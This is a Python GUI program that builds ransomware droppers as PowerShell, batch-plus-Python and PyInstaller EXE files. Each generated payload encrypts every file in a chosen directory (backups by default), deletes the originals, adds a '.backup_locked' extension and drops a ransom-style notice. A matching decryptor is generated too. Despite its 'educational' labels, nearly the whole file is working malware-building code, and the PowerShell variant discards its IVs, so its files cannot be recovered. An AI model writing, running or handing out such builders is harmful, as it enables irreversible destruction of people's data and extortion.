#!/usr/bin/env python3
"""
ADVANCED DROPPER CREATOR GUI
Creates PS1, EXE, and BAT droppers with pre-generated keys
Stores decryptor in target backup folder
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import sys
import base64
import threading
from pathlib import Path
from cryptography.fernet import Fernet
import subprocess
import tempfile
import shutil

class AdvancedDropperCreatorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Dropper Creator - Educational Security Tool")
        self.root.geometry("800x700")
        self.root.resizable(True, True)
        
        # Variables
        self.encryption_key = None
        self.target_directory = tk.StringVar(value="D:\\Backup")
        self.output_directory = tk.StringVar()
        self.dropper_types = {
            "PowerShell (.ps1)": tk.BooleanVar(value=True),
            "Batch (.bat)": tk.BooleanVar(value=True),
            "Executable (.exe)": tk.BooleanVar(value=True)
        }
        
        self.setup_gui()
        self.generate_initial_key()
        
    def setup_gui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="Advanced Dropper Creator", 
                               font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # Key Generation Section
        key_frame = ttk.LabelFrame(main_frame, text="Encryption Key Management", padding="10")
        key_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        key_frame.columnconfigure(1, weight=1)
        
        ttk.Label(key_frame, text="Current Encryption Key:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.key_display = ttk.Entry(key_frame, width=50, state="readonly")
        self.key_display.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(10, 0), pady=5)
        
        key_buttons_frame = ttk.Frame(key_frame)
        key_buttons_frame.grid(row=1, column=0, columnspan=2, pady=(10, 0))
        
        ttk.Button(key_buttons_frame, text="Generate New Key", 
                  command=self.generate_new_key).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(key_buttons_frame, text="Copy Key", 
                  command=self.copy_key).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(key_buttons_frame, text="Save Key to File", 
                  command=self.save_key_to_file).pack(side=tk.LEFT)
        
        # Target Directory Section
        target_frame = ttk.LabelFrame(main_frame, text="Target Settings", padding="10")
        target_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        target_frame.columnconfigure(1, weight=1)
        
        ttk.Label(target_frame, text="Target Directory:").grid(row=0, column=0, sticky=tk.W, pady=5)
        target_entry = ttk.Entry(target_frame, textvariable=self.target_directory, width=50)
        target_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(10, 5), pady=5)
        ttk.Button(target_frame, text="Browse", 
                  command=self.browse_target_directory).grid(row=0, column=2, pady=5)
        
        # Output Directory Section
        ttk.Label(target_frame, text="Output Directory:").grid(row=1, column=0, sticky=tk.W, pady=5)
        output_entry = ttk.Entry(target_frame, textvariable=self.output_directory, width=50)
        output_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(10, 5), pady=5)
        ttk.Button(target_frame, text="Browse", 
                  command=self.browse_output_directory).grid(row=1, column=2, pady=5)
        
        # Dropper Types Section
        types_frame = ttk.LabelFrame(main_frame, text="Dropper Types to Create", padding="10")
        types_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        row = 0
        for dropper_type, var in self.dropper_types.items():
            ttk.Checkbutton(types_frame, text=dropper_type, variable=var).grid(
                row=row, column=0, sticky=tk.W, pady=2)
            row += 1
        
        # Action Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=4, column=0, columnspan=3, pady=(20, 10))
        
        ttk.Button(button_frame, text="Create Selected Droppers", 
                  command=self.create_droppers_threaded, 
                  style="Accent.TButton").pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Create All Droppers", 
                  command=self.create_all_droppers_threaded).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(button_frame, text="Deploy Decryptor Only", 
                  command=self.deploy_decryptor_threaded).pack(side=tk.LEFT)
        
        # Progress and Log Section
        log_frame = ttk.LabelFrame(main_frame, text="Progress Log", padding="10")
        log_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(10, 0))
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(5, weight=1)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, width=70)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Clear log button
        ttk.Button(log_frame, text="Clear Log", 
                  command=self.clear_log).grid(row=1, column=0, pady=(10, 0))
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.grid(row=6, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
        
    def log_message(self, message):
        """Add message to log"""
        self.log_text.insert(tk.END, f"{message}\n")
        self.log_text.see(tk.END)
        self.root.update_idletasks()
        
    def generate_initial_key(self):
        """Generate initial encryption key"""
        self.encryption_key = Fernet.generate_key()
        self.key_display.configure(state="normal")
        self.key_display.delete(0, tk.END)
        self.key_display.insert(0, base64.b64encode(self.encryption_key).decode())
        self.key_display.configure(state="readonly")
        self.log_message("[KEY] Initial encryption key generated")
        
    def generate_new_key(self):
        """Generate new encryption key"""
        self.encryption_key = Fernet.generate_key()
        self.key_display.configure(state="normal")
        self.key_display.delete(0, tk.END)
        self.key_display.insert(0, base64.b64encode(self.encryption_key).decode())
        self.key_display.configure(state="readonly")
        self.log_message("[KEY] New encryption key generated")
        messagebox.showinfo("Key Generated", "New encryption key has been generated!")
        
    def copy_key(self):
        """Copy key to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(base64.b64encode(self.encryption_key).decode())
        messagebox.showinfo("Key Copied", "Encryption key copied to clipboard!")
        
    def save_key_to_file(self):
        """Save key to file"""
        if not self.encryption_key:
            messagebox.showerror("Error", "No key to save!")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".key",
            filetypes=[("Key files", "*.key"), ("All files", "*.*")],
            title="Save Encryption Key"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(base64.b64encode(self.encryption_key).decode())
                self.log_message(f"[SAVE] Key saved to: {filename}")
                messagebox.showinfo("Success", f"Key saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save key: {e}")
                
    def browse_target_directory(self):
        """Browse for target directory"""
        directory = filedialog.askdirectory(title="Select Target Directory")
        if directory:
            self.target_directory.set(directory)
            
    def browse_output_directory(self):
        """Browse for output directory"""
        directory = filedialog.askdirectory(title="Select Output Directory")
        if directory:
            self.output_directory.set(directory)
            
    def clear_log(self):
        """Clear the log text"""
        self.log_text.delete(1.0, tk.END)
        
    def deploy_decryptor_threaded(self):
        """Deploy decryptor in separate thread"""
        thread = threading.Thread(target=self.deploy_decryptor)
        thread.daemon = True
        thread.start()
        
    def create_droppers_threaded(self):
        """Create selected droppers in separate thread"""
        thread = threading.Thread(target=self.create_selected_droppers)
        thread.daemon = True
        thread.start()
        
    def create_all_droppers_threaded(self):
        """Create all droppers in separate thread"""
        thread = threading.Thread(target=self.create_all_droppers)
        thread.daemon = True
        thread.start()
        
    def deploy_decryptor(self):
        """Deploy decryptor to target directory"""
        try:
            self.status_var.set("Deploying decryptor...")
            target_dir = Path(self.target_directory.get())
            
            if not target_dir.exists():
                target_dir.mkdir(parents=True)
                self.log_message(f"[CREATE] Created target directory: {target_dir}")
            
            # Create decryptor script
            decryptor_script = self.create_decryptor_script()
            decryptor_path = target_dir / "backup_decryptor.py"
            
            with open(decryptor_path, 'w') as f:
                f.write(decryptor_script)
                
            self.log_message(f"[DEPLOY] Decryptor deployed to: {decryptor_path}")
            self.status_var.set("Decryptor deployed successfully!")
            messagebox.showinfo("Success", f"Decryptor deployed to {target_dir}")
            
        except Exception as e:
            self.log_message(f"[ERROR] Deployment failed: {e}")
            self.status_var.set("Deployment failed")
            messagebox.showerror("Error", f"Deployment failed: {e}")
            
    def create_decryptor_script(self):
        """Create the decryptor Python script"""
        return f'''#!/usr/bin/env python3
"""
BACKUP FOLDER DECRYPTOR
Educational decryption tool for backup folder encryption
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet

class BackupDecryptor:
    def __init__(self):
        self.target_directory = "{self.target_directory.get()}"
        self.extension = ".backup_locked"
        self.key = None
        
    def set_key_from_input(self):
        """Get key from user input"""
        print("=" * 50)
        print("BACKUP FOLDER DECRYPTOR")
        print("=" * 50)
        print("Enter the encryption key (base64 format):")
        key_input = input().strip()
        
        try:
            self.key = base64.b64decode(key_input)
            return True
        except Exception as e:
            print(f"[ERROR] Invalid key format: {{e}}")
            return False
            
    def decrypt_files(self):
        """Decrypt all files in target directory"""
        if not self.key:
            print("[ERROR] No decryption key provided")
            return False
            
        try:
            cipher = Fernet(self.key)
        except Exception as e:
            print(f"[ERROR] Invalid key: {{e}}")
            return False
            
        target_path = Path(self.target_directory)
        if not target_path.exists():
            print(f"[ERROR] Target directory not found: {{self.target_directory}}")
            return False
            
        print(f"[TARGET] Decrypting files in {{self.target_directory}}")
        
        decrypted_count = 0
        failed_count = 0
        
        for file_path in target_path.rglob(f"*{{self.extension}}"):
            if file_path.is_file():
                try:
                    print(f"[DECRYPTING] {{file_path.name}}")
                    
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                        
                    decrypted_data = cipher.decrypt(encrypted_data)
                    
                    original_name = str(file_path)[:-len(self.extension)]
                    with open(original_name, 'wb') as f:
                        f.write(decrypted_data)
                        
                    file_path.unlink()
                    decrypted_count += 1
                    print(f"  -> Successfully decrypted")
                    
                except Exception as e:
                    print(f"  -> Failed to decrypt: {{e}}")
                    failed_count += 1
                    
        # Remove ransom note
        note_path = target_path / "BACKUP_ENCRYPTION_NOTICE.txt"
        if note_path.exists():
            note_path.unlink()
            print("[NOTE] Removed encryption notice")
            
        print(f"[COMPLETE] Decrypted {{decrypted_count}} files, failed {{failed_count}} files")
        return decrypted_count > 0

def main():
    decryptor = BackupDecryptor()
    if decryptor.set_key_from_input():
        decryptor.decrypt_files()
    else:
        print("Decryption failed due to invalid key")

if __name__ == "__main__":
    main()
'''

    def create_selected_droppers(self):
        """Create only selected dropper types"""
        selected_types = [dtype for dtype, var in self.dropper_types.items() if var.get()]
        if not selected_types:
            messagebox.showwarning("Warning", "Please select at least one dropper type!")
            return
            
        self._create_droppers(selected_types)
        
    def create_all_droppers(self):
        """Create all dropper types"""
        all_types = list(self.dropper_types.keys())
        self._create_droppers(all_types)
        
    def _create_droppers(self, dropper_types):
        """Internal method to create droppers"""
        try:
            self.status_var.set("Creating droppers...")
            
            # Set default output directory if not specified
            if not self.output_directory.get():
                output_dir = Path("generated_droppers")
                output_dir.mkdir(exist_ok=True)
                self.output_directory.set(str(output_dir))
            else:
                output_dir = Path(self.output_directory.get())
                output_dir.mkdir(exist_ok=True)
                
            self.log_message(f"[OUTPUT] Creating droppers in: {output_dir}")
            
            # Create each selected dropper type
            for dropper_type in dropper_types:
                if "PowerShell" in dropper_type:
                    self.create_powershell_dropper(output_dir)
                elif "Batch" in dropper_type:
                    self.create_batch_dropper(output_dir)
                elif "Executable" in dropper_type:
                    self.create_executable_dropper(output_dir)
                    
            self.status_var.set("Droppers created successfully!")
            messagebox.showinfo("Success", f"Droppers created in {output_dir}")
            
        except Exception as e:
            self.log_message(f"[ERROR] Failed to create droppers: {e}")
            self.status_var.set("Dropper creation failed")
            messagebox.showerror("Error", f"Failed to create droppers: {e}")
            
    def create_powershell_dropper(self, output_dir):
        """Create PowerShell dropper"""
        ps1_content = f'''# EDUCATIONAL BACKUP FOLDER ENCRYPTOR - PowerShell
# Encrypts files in {self.target_directory.get()}

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "   BACKUP FOLDER ENCRYPTION DROPPER" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "Target: {self.target_directory.get()}" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Yellow

# Generate encryption key
$aes = New-Object System.Security.Cryptography.AesManaged
$aes.GenerateKey()
$key = $aes.Key
$keyBase64 = [Convert]::ToBase64String($key)

Write-Host "[KEY] Encryption Key (save this!):" -ForegroundColor Magenta
Write-Host $keyBase64 -ForegroundColor White
Write-Host ""

# Target directory
$targetDir = "{self.target_directory.get()}"
$extension = ".backup_locked"

# Create directory if it doesn't exist
if (-not (Test-Path $targetDir)) {{
    Write-Host "[INFO] Creating target directory..." -ForegroundColor Yellow
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    
    # Create demo files
    $demoFiles = @{{
        "important_backup.txt" = "This is important backup data"
        "family_photos.zip" = "Family photos archive"
        "work_documents.rar" = "Work documents"
        "financial_records.xlsx" = "Financial records"
    }}
    
    foreach ($file in $demoFiles.GetEnumerator()) {{
        $filePath = Join-Path $targetDir $file.Key
        $file.Value | Out-File -FilePath $filePath -Encoding UTF8
    }}
    Write-Host "[INFO] Created demo files for testing" -ForegroundColor Green
}}

Write-Host "[TARGET] Encrypting files in $targetDir" -ForegroundColor Cyan

$encryptedCount = 0
$failedCount = 0

# Get all files
$files = Get-ChildItem -Path $targetDir -File -Recurse | Where-Object {{
    $_.Extension -ne $extension -and $_.Name -ne "BACKUP_ENCRYPTION_NOTICE.txt"
}}

foreach ($file in $files) {{
    try {{
        Write-Host "[ENCRYPTING] $($file.Name)" -ForegroundColor Yellow
        
        $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
        $aes.GenerateIV()
        $encryptor = $aes.CreateEncryptor()
        $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
        
        $newFileName = $file.FullName + $extension
        [System.IO.File]::WriteAllBytes($newFileName, $encryptedContent)
        Remove-Item $file.FullName -Force
        
        $encryptedCount++
        Write-Host "  -> Successfully encrypted" -ForegroundColor Green
        
    }} catch {{
        Write-Host "  -> Failed to encrypt: $($_.Exception.Message)" -ForegroundColor Red
        $failedCount++
    }}
}}

# Create ransom note
$noteContent = @"
================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted.

Target Directory: $targetDir
Files Encrypted: $encryptedCount
Extension Added: $extension

Save this key for decryption:
$keyBase64

Educational Purpose Only
================================
"@

$notePath = Join-Path $targetDir "BACKUP_ENCRYPTION_NOTICE.txt"
$noteContent | Out-File -FilePath $notePath -Encoding UTF8

Write-Host "[NOTE] Created encryption notice" -ForegroundColor Cyan
Write-Host "[COMPLETE] Encrypted $encryptedCount files, failed $failedCount files" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Yellow

Write-Host "`nPress any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
'''

        ps1_path = output_dir / "backup_encryptor.ps1"
        with open(ps1_path, 'w') as f:
            f.write(ps1_content)
        self.log_message(f"[CREATE] PowerShell dropper: {ps1_path}")
        
    def create_batch_dropper(self, output_dir):
        """Create Batch dropper"""
        bat_content = f'''@echo off
cls
echo ========================================
echo    BACKUP FOLDER ENCRYPTION DROPPER
echo ========================================
echo Target: {self.target_directory.get()}
echo ========================================

REM Check if Python is available
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python not found in PATH
    echo [INFO] Please install Python
    pause
    exit /b 1
)

echo [STATUS] Starting backup folder encryption...
echo [TARGET] {self.target_directory.get()}

REM Run Python encryption script
python "%~dp0backup_encryptor.py"

echo ========================================
echo ENCRYPTION PROCESS COMPLETE
echo ========================================
pause
'''

        # Also create the Python script that the batch file calls
        py_content = f'''#!/usr/bin/env python3
import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet

key = {self.encryption_key}
cipher = Fernet(key)
target_dir = Path(r"{self.target_directory.get()}")
extension = ".backup_locked"

print("=" * 60)
print("BACKUP FOLDER ENCRYPTION DROPPER")
print("=" * 60)
print(f"Target Directory: {{target_dir}}")
print("=" * 60)

if not target_dir.exists():
    target_dir.mkdir(parents=True)
    print("[INFO] Created target directory")
    
    # Create demo files
    demo_files = {{
        "important_backup.txt": "This is important backup data",
        "family_photos.zip": "Family photos archive",
        "work_documents.rar": "Work documents",
        "financial_records.xlsx": "Financial records"
    }}
    
    for filename, content in demo_files.items():
        file_path = target_dir / filename
        with open(file_path, 'w') as f:
            f.write(content)
    print("[INFO] Created demo files for testing")

print("[STATUS] Using pre-generated key")
print(f"[KEY] {{base64.b64encode(key).decode()}}")
print(f"[TARGET] Encrypting files in {{target_dir}}")

encrypted_count = 0
for file_path in target_dir.rglob("*"):
    if file_path.is_file() and not file_path.name.endswith(extension):
        try:
            print(f"[ENCRYPTING] {{file_path.name}}")
            
            with open(file_path, 'rb') as f:
                data = f.read()
                
            encrypted_data = cipher.encrypt(data)
            new_path = str(file_path) + extension
            
            with open(new_path, 'wb') as f:
                f.write(encrypted_data)
                
            file_path.unlink()
            encrypted_count += 1
            print(f"  -> Successfully encrypted")
            
        except Exception as e:
            print(f"  -> Failed to encrypt: {{e}}")

# Create ransom note
note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted.

Target Directory: {{target_dir}}
Files Encrypted: {{encrypted_count}}
Extension Added: {{extension}}

Save this key for decryption:
{{base64.b64encode(key).decode()}}

Educational Purpose Only
================================
"""

note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
with open(note_path, 'w') as f:
    f.write(note_content)

print(f"[NOTE] Created encryption notice: {{note_path.name}}")
print(f"[COMPLETE] Encrypted {{encrypted_count}} files")
print("=" * 60)
input("Press Enter to exit...")
'''

        bat_path = output_dir / "backup_encryptor.bat"
        py_path = output_dir / "backup_encryptor.py"
        
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        with open(py_path, 'w') as f:
            f.write(py_content)
            
        self.log_message(f"[CREATE] Batch dropper: {bat_path}")
        self.log_message(f"[CREATE] Python helper: {py_path}")
        
    def create_executable_dropper(self, output_dir):
        """Create actual EXE dropper using reliable standalone script"""
        try:
            self.log_message("[EXE] Creating standalone executable dropper...")
            
            # Use direct EXE creation to avoid import issues
            # Handle import when running from within core_system directory
            import sys
            import os
            current_dir = os.path.dirname(os.path.abspath(__file__))
            if current_dir not in sys.path:
                sys.path.insert(0, current_dir)
            
            try:
                from gui_exe_creator import create_exe_direct
            except ImportError:
                # Fallback import
                from core_system.gui_exe_creator import create_exe_direct
            
            # Create EXE with current settings
            exe_path, key = create_exe_direct(
                target_directory=self.target_directory.get(),
                output_directory=str(output_dir),
                encryption_key=self.encryption_key
            )
            
            if exe_path and exe_path.exists():
                size = exe_path.stat().st_size
                self.log_message(f"[SUCCESS] EXE dropper created: {exe_path}")
                self.log_message(f"[INFO] Size: {size:,} bytes")
                self.log_message(f"[KEY] Encryption key: {key}")
            else:
                self.log_message("[ERROR] Failed to create EXE dropper")
                
        except Exception as e:
            self.log_message(f"[ERROR] EXE creation failed: {e}")
            import traceback
            self.log_message(f"[DEBUG] {traceback.format_exc()}")
    
    def create_temp_encryptor_script(self):
        """Create temporary Python script for EXE compilation"""
        return f'''#!/usr/bin/env python3
"""
BACKUP FOLDER ENCRYPTOR - Standalone Executable
Educational ransomware simulation dropper
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import time

def main():
    # Pre-generated encryption key
    key = {self.encryption_key}
    cipher = Fernet(key)
    target_dir = Path(r"{self.target_directory.get()}")
    extension = ".backup_locked"
    
    print("=" * 60)
    print("BACKUP FOLDER ENCRYPTION DROPPER")
    print("=" * 60)
    print(f"Target Directory: {{target_dir}}")
    print("=" * 60)
    
    # Display key for educational purposes
    print(f"[KEY] {{base64.b64encode(key).decode()}}")
    print("")
    
    if not target_dir.exists():
        target_dir.mkdir(parents=True)
        print("[INFO] Created target directory")
        
        # Create demo files
        demo_files = {{
            "important_backup.txt": "This is important backup data",
            "family_photos.zip": "Family photos archive",
            "work_documents.rar": "Work documents",
            "financial_records.xlsx": "Financial records"
        }}
        
        for filename, content in demo_files.items():
            file_path = target_dir / filename
            with open(file_path, 'w') as f:
                f.write(content)
        print("[INFO] Created demo files for testing")
    
    print(f"[TARGET] Encrypting files in {{target_dir}}")
    time.sleep(1)  # Dramatic pause
    
    encrypted_count = 0
    for file_path in target_dir.rglob("*"):
        if file_path.is_file() and not file_path.name.endswith(extension):
            try:
                print(f"[ENCRYPTING] {{file_path.name}}")
                
                with open(file_path, 'rb') as f:
                    data = f.read()
                    
                encrypted_data = cipher.encrypt(data)
                new_path = str(file_path) + extension
                
                with open(new_path, 'wb') as f:
                    f.write(encrypted_data)
                    
                file_path.unlink()
                encrypted_count += 1
                print(f"  -> Successfully encrypted")
                
            except Exception as e:
                print(f"  -> Failed to encrypt: {{e}}")
    
    # Create ransom note
    note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted by educational ransomware.

Target Directory: {{target_dir}}
Files Encrypted: {{encrypted_count}}
Extension Added: {{extension}}

This is an educational simulation designed to demonstrate:
- How ransomware targets backup directories
- The importance of offline backups
- Why backup security is crucial

Educational Purpose Only
================================
"""
    
    note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
    with open(note_path, 'w') as f:
        f.write(note_content)
    
    print(f"[NOTE] Created educational notice: {{note_path.name}}")
    print(f"[COMPLETE] Encrypted {{encrypted_count}} files")
    print("=" * 60)
    print("BACKUP FOLDER ENCRYPTION COMPLETE")
    print("=" * 60)
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
'''
    
    def create_exe_instructions_fallback(self, output_dir):
        """Create fallback instructions if PyInstaller fails"""
        info_content = f'''# EXE DROPPER CREATION FAILED - MANUAL STEPS REQUIRED

PyInstaller is not available or failed. Please follow these steps:

1. Install PyInstaller:
   pip install pyinstaller

2. Create the executable:
   pyinstaller --onefile --windowed "{output_dir / 'temp_encryptor.py'}" --name BackupFolderEncryptor --distpath "{output_dir}"

3. The executable will be created as:
   {str(output_dir)}\\BackupFolderEncryptor.exe

Pre-generated encryption key: {base64.b64encode(self.encryption_key).decode()}
Target directory: {self.target_directory.get()}

Alternatively, use the PowerShell or Batch droppers which are already created.
'''

        info_path = output_dir / "exe_creation_failed.txt"
        with open(info_path, 'w') as f:
            f.write(info_content)
        self.log_message(f"[INFO] EXE creation failed, instructions saved: {info_path}")

def main():
    root = tk.Tk()
    app = AdvancedDropperCreatorGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()